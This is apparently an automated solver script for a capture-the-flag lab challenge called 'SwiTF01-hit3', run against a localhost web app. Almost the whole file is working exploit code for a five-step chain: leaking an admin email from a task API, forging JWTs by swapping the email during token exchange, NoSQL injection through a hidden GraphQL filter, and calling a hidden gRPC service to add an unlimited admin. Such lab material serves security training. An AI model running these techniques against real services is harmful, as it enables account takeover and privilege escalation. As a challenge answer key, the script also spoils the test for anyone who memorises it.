#!/usr/bin/env python3
"""
SwiTF01-hit3 — Automated Solver
================================
Walks the full 5-step attack chain and prints the flag.

Just run:  python3 solver.py
Dependencies are installed automatically on first run.
"""

# ─── Bootstrap: auto-install dependencies if missing ─────────────────────────
import sys, os, subprocess

REQUIRED = ["requests", "grpc_requests"]

def _missing() -> list[str]:
    missing = []
    for pkg in REQUIRED:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    return missing

if _missing():
    _venv = os.path.join(os.path.dirname(__file__), ".venv")
    _pip  = os.path.join(_venv, "bin", "pip")
    _py   = os.path.join(_venv, "bin", "python3")

    if not os.path.isdir(_venv):
        print("[*] Creating virtual environment …")
        subprocess.check_call([sys.executable, "-m", "venv", _venv])

    print("[*] Installing dependencies …")
    subprocess.check_call([_pip, "install", "--quiet", "requests", "grpc-requests"])

    # Re-execute this script inside the venv
    os.execv(_py, [_py] + sys.argv)

# ─────────────────────────────────────────────────────────────────────────────

import base64
import requests
# pyrefly: ignore [missing-import]
from grpc_requests import ReflectionClient

# ─── Config ──────────────────────────────────────────────────────────────────

REST_BASE      = "http://localhost:4000/api/v1"
GRAPHQL_URL    = "http://localhost:4000/graphql"
GRPC_HOST      = "localhost:50051"

PLAYER_USER    = "swilam"
PLAYER_PASS    = "swift123"
CODE_CHALLENGE = base64.b64encode(b"test").decode()  # dGVzdA==
CODE_VERIFIER  = "test"

# ─── Helpers ─────────────────────────────────────────────────────────────────

def ok(label: str, value: str = "") -> None:
    print(f"  \033[92m[+]\033[0m {label}" + (f": {value}" if value else ""))

def fail(label: str) -> None:
    print(f"  \033[91m[-]\033[0m {label}")
    sys.exit(1)

def step(n: int, title: str) -> None:
    print(f"\n\033[1;94m[Step {n}]\033[0m {title}")

# ─── Step 1: PII Leak — extract admin email from task API ────────────────────

def step1_pii_leak() -> str:
    step(1, "PII Leak — extract admin email via GET /projects/:id/tasks")

    # Login as swilam to get a valid token
    r = requests.post(f"{REST_BASE}/auth/login", json={
        "username": PLAYER_USER,
        "password": PLAYER_PASS,
        "codeChallenge": CODE_CHALLENGE,
    })
    if r.status_code != 200 or "authorizationCode" not in r.json():
        fail(f"Login failed: {r.text}")

    auth_code    = r.json()["authorizationCode"]
    player_email = r.json().get("email", f"{PLAYER_USER}@switf.local")

    # Exchange for a player JWT (own email — no tampering yet)
    r = requests.post(f"{REST_BASE}/auth/token", json={
        "authorizationCode": auth_code,
        "grantType": "authorization_code",
        "codeVerifier": CODE_VERIFIER,
        "email": player_email,
    })
    if r.status_code != 200 or "access_token" not in r.json():
        fail(f"Token exchange failed: {r.text}")

    player_jwt = r.json()["access_token"]
    headers    = {"Authorization": f"Bearer {player_jwt}"}

    # List projects to find the one owned by admin
    r = requests.get(f"{REST_BASE}/projects", headers=headers)
    if r.status_code != 200:
        fail(f"Projects list failed: {r.text}")

    projects = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    if not projects:
        fail("No projects found — check seed data")

    # Find the project whose owner is 'admin' (or fall back to first project)
    admin_project = next(
        (p for p in projects if p.get("owner", {}).get("username") == "admin"),
        projects[0]
    )
    project_id = admin_project.get("id") or admin_project.get("_id")
    ok(f"Found admin project", admin_project.get("name", project_id))

    # Fetch tasks for that project — creator.email is leaked in the response
    r = requests.get(f"{REST_BASE}/projects/{project_id}/tasks", headers=headers)
    if r.status_code != 200:
        fail(f"Project tasks failed: {r.text}")

    tasks = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    if not tasks:
        fail("No tasks in admin project — check seed data")

    # Find a task created by admin
    admin_task = next(
        (t for t in tasks if t.get("creator", {}).get("name") == "admin"),
        tasks[0]
    )
    task_id     = admin_task.get("id") or admin_task.get("_id")
    creator     = admin_task.get("creator", {})
    admin_email = creator.get("email")

    if not admin_email:
        # Fallback: fetch individual task (PII also present there)
        r = requests.get(f"{REST_BASE}/tasks/{task_id}", headers=headers)
        if r.status_code == 200:
            admin_email = r.json().get("creator", {}).get("email")
    if not admin_email:
        fail(f"Creator email not in response — check task endpoint. Got: {admin_task}")

    ok("Admin email leaked from task creator field", admin_email)
    return admin_email

# ─── Step 2: Auth Bypass — get a JWT for any email ───────────────────────────

def step2_auth_bypass(target_email: str) -> str:
    step(2, f"Auth Bypass — obtain JWT for {target_email}")

    # Login as the player to get a valid auth code
    r = requests.post(f"{REST_BASE}/auth/login", json={
        "username": PLAYER_USER,
        "password": PLAYER_PASS,
        "codeChallenge": CODE_CHALLENGE,
    })
    if r.status_code != 200 or "authorizationCode" not in r.json():
        fail(f"Login failed: {r.text}")

    auth_code = r.json()["authorizationCode"]

    # Tamper: swap our email for the target email in the token exchange
    r = requests.post(f"{REST_BASE}/auth/token", json={
        "authorizationCode": auth_code,
        "grantType": "authorization_code",
        "codeVerifier": CODE_VERIFIER,
        "email": target_email,
    })
    if r.status_code != 200 or "access_token" not in r.json():
        fail(f"Token exchange failed: {r.text}")

    jwt  = r.json()["access_token"]
    role = r.json().get("role", "?")
    ok(f"JWT obtained (role={role})", jwt[:40] + "…")
    return jwt

# ─── Step 3: GraphQL NoSQLi — leak superadmin email ─────────────────────────

def step3_graphql_nosqli(admin_jwt: str) -> str:
    step(3, "GraphQL NoSQLi — extract superadmin email via rawFilter")

    headers = {
        "Authorization": f"Bearer {admin_jwt}",
        "Content-Type": "application/json",
    }

    # rawFilter is hidden from the UI but discoverable via introspection
    payload = {
        "query": "query($filter: JSON) { searchAdmins(rawFilter: $filter) { name email } }",
        "variables": {"filter": {"role": "superadmin"}},
    }

    r = requests.post(GRAPHQL_URL, json=payload, headers=headers)
    if r.status_code != 200:
        fail(f"GraphQL request failed: {r.text}")

    data = r.json().get("data", {}).get("searchAdmins", [])
    if not data:
        fail(f"No superadmin found via rawFilter. Response: {r.json()}")

    superadmin_email = data[0].get("email")
    if not superadmin_email or superadmin_email == "****":
        fail(f"Email masked or missing: {data}")

    ok("Superadmin email extracted via NoSQLi", superadmin_email)
    return superadmin_email

# ─── Step 4: Auth Bypass again — superadmin JWT ──────────────────────────────

def step4_superadmin_jwt(superadmin_email: str) -> str:
    step(4, f"Auth Bypass — obtain superadmin JWT for {superadmin_email}")
    return step2_auth_bypass(superadmin_email)

# ─── Step 5: gRPC reflection → hidden service → add 6th admin → flag ─────────

def step5_grpc_flag(superadmin_jwt: str) -> str:
    step(5, "gRPC — discover SuperAdminService via reflection, add 6th admin, retrieve flag")

    metadata = [("authorization", f"Bearer {superadmin_jwt}")]

    # Connect using server reflection — no .proto file needed, like grpcurl
    client = ReflectionClient(GRPC_HOST)

    services = [s for s in client.service_names if "grpc." not in s]
    ok("Services discovered via reflection", ", ".join(services))

    if "admin.SuperAdminService" not in client.service_names:
        fail("SuperAdminService not found — gRPC reflection may be disabled")

    # ── 5b: Call the hidden service (no 5-admin limit) ────────────────────────
    # Use a unique email per run to avoid MongoDB duplicate key errors
    import time as _time
    unique_email = f"solver-{int(_time.time())}@switf.local"
    sa_service = client.service("admin.SuperAdminService")
    add_resp = sa_service.AddUnlimitedAdmin(
        {"name": "solver-pwn", "role": "admin", "email": unique_email},
        metadata=metadata,
    )
    ok("AddUnlimitedAdmin response", str(add_resp))

    # ── 5c: List admins — flag is injected as 6th admin's name ───────────────
    admin_service = client.service("admin.AdminService")
    list_resp = admin_service.ListAdmins({}, metadata=metadata)

    admins = list_resp.get("admins", [])
    ok(f"Total admins returned", str(len(admins)))

    if len(admins) < 6:
        fail(f"Expected ≥6 admins, got {len(admins)}. Flag not triggered.")

    flag_name = admins[5].get("name", "")
    if "{" not in flag_name:
        fail(f"6th admin name doesn't look like a flag: {flag_name!r}")

    return flag_name

# ─── Main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    print("\n\033[1;95m══════════════════════════════════════\033[0m")
    print("\033[1;95m   SwiTF01-hit3  —  Automated Solver  \033[0m")
    print("\033[1;95m══════════════════════════════════════\033[0m")

    try:
        admin_email      = step1_pii_leak()
        admin_jwt        = step2_auth_bypass(admin_email)
        superadmin_email = step3_graphql_nosqli(admin_jwt)
        superadmin_jwt   = step4_superadmin_jwt(superadmin_email)
        flag             = step5_grpc_flag(superadmin_jwt)

        print(f"\n\033[1;92m{'═'*42}\033[0m")
        print(f"\033[1;92m  FLAG: {flag}\033[0m")
        print(f"\033[1;92m{'═'*42}\033[0m\n")

    except SystemExit:
        print("\n\033[1;91m[!] Solver failed — see error above.\033[0m\n")
        sys.exit(1)

if __name__ == "__main__":
    main()
